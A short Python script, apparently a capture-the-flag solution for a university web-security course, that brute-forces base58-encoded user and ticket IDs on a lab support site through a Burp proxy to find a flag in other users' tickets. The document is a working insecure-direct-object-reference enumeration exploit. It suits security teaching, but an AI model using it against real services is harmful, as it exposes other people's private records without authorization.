import requests
import base58
import time
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

# Silences warnings about not verifying Burp's CA certificate.
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Function to send the POST request
def send_get_request(url, session):
    response = session.get(url)
    return response

# Set up the session
s = requests.session()
s.verify = False  # Skip trying to verify TLS certs.
s.proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}  # Proxy requests through Burp.

url = "https://support.quoccabank.com/raw/"

lowerID = 0 # change bounds
upperID = 0 # change bounds
maxTicketNum = 0 # change bounds

for userIdCounter in range(lowerID, upperID):
    for postIdCounter in range(1, maxTicketNum):
        time.sleep(0.1)

        # Creates the base58 encoded string representing the userId and tickerNum
        string = str(userIdCounter) + ":" + str(postIdCounter)
        cutbase58encoded = str(base58.b58encode(string))[2:-1]

        # Sends the get request for that base58 encoded string
        response = send_get_request(url + cutbase58encoded, s)
        print(f"Testing {userIdCounter}:{postIdCounter} ({url + cutbase58encoded})")

        # If the ticket exists it is checked if it contains COMP6443 (flag indicator) and if it is, prints the contents with the flag and kills the program. 
        # Won't get both flags running at once
        if (response.status_code != 505 and response.status_code != 404):
            if (str(response.content).__contains__("COMP6443{")):
                print(response.content)
                exit()
            continue

        break
        
        








